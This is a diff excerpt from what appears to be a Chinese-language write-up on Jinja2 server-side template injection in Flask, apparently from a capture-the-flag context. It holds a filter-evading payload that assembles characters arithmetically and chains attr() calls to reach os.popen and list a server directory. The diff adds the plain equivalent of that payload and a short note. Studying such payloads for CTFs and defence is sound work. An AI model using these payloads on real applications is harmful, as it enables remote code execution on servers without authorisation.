@@ -512,7 +512,11 @@
 &#123;% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;
 &#123;% set space=chcr(three*three*five-five-five-three) %&#125;
 &#123;% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %&#125;
-&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125;</code></pre>
+&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125;
+==
+lipsum.__globals__.get(&#39;__builtins__&#39;).os.popen(&#39;ls /var/www/flask&#39;).read()
+注：
+&#123;% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;需要get获取</code></pre>
 <p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/">jinja2官方文档</a></p>
 <pre><code>&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句。
 &#123;&#123;&#125;&#125;用于将表达式打印到模板输出
